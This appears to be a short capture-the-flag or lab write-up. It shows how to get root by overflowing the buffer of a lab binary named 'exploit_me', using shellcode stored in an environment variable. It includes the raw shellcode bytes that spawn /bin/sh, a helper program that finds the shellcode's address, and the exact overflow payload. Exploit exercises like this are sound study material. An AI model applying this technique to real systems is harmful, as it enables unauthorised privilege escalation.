# SHELLCODE

When we are the ZAZ user, instead of the ret2libc attack we can use a SHELLCODE.

We can find multiple SHELLCODES on the internet i'm using a basic one that just launch a shell as root.

First we export our SHELLCODE:

	export SHELLCODE=`python -c 'print "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`

Then to see where the address of our env we launch a little script:

	echo 'void main(){printf("%p\n", getenv("SHELLCODE"));}' > /tmp/getenv.c
    gcc /tmp/getenv.c -o /tmp/shellcode
    chmod 777 /tmp/shellcode
    /tmp/shellcode 

It gives us our address:

	0xbffff8f5

Then we use the bufferoverflow of exploit_me:

	./exploit_me `python -c "print 'A' * 140 + '\xf5\xf8\xff\xbf'"` 

And we are root !!!
